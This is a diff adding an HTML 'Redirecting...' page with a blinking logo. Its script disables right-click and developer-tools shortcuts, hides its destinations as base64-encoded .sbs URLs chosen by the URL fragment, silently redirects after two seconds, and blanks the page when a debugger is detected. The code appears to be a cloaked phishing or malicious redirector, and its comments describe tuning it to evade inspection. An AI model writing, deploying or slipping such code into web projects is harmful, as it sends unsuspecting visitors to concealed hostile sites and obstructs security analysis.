@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #fff;
+        }
+        .logo-container {
+            text-align: center;
+            opacity: 0;
+            animation: blink 2.5s ease-in-out infinite;
+        }
+        .logo-container img {
+            max-width: 200px;
+            height: auto;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 0; }
+            50%       { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQduXJREqBe_A7tkWoD48jL35xRpT_WaxP_tQ&s" alt="Logo">
+    </div>
+    <script type="text/javascript">
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.keyCode === 123) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 67) { e.preventDefault(); return false; }
+        });
+
+        // --- Destination routing by fragment ---
+        var ROUTES = {
+            '1': 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9tb3Zpbmd5b3U5OTk=',
+            '2': 'aHR0cHM6Ly90cmlnb25hbHByby5zYnMva2FsaS9yZWRpcmVjLw=='
+        };
+
+        function pickDestination() {
+            var hash = window.location.hash.replace(/^#/, '');
+
+            if (!hash && document.referrer) {
+                var refHash = document.referrer.split('#')[1];
+                if (refHash) hash = refHash;
+            }
+
+            if (!hash || !ROUTES[hash]) hash = '1';
+
+            try {
+                var decoded = atob(ROUTES[hash]);
+                // sanity: must look like a URL
+                if (!/^https?:\/\//i.test(decoded)) {
+                    decoded = atob(ROUTES['1']);
+                }
+                return decoded;
+            } catch (err) {
+                return atob(ROUTES['1']);
+            }
+        }
+
+        // Fire the redirect FIRST, before any anti-debug interval can nuke the page.
+        var destination = pickDestination();
+        // uncomment the next line temporarily if you want to debug in console:
+        // console.log('[route]', window.location.hash, '->', destination);
+
+        setTimeout(function() {
+            window.location.replace(destination);
+        }, 2000);
+
+        // Anti-debug interval moved AFTER the redirect is scheduled,
+        // and relaxed so background tabs don't false-positive.
+        setInterval(function() {
+            var start = performance.now();
+            debugger;
+            var end = performance.now();
+            // only nuke if the pause was severe AND we're still on this page
+            if (end - start > 250 && document.visibilityState === 'visible') {
+                window.location.replace('about:blank');
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
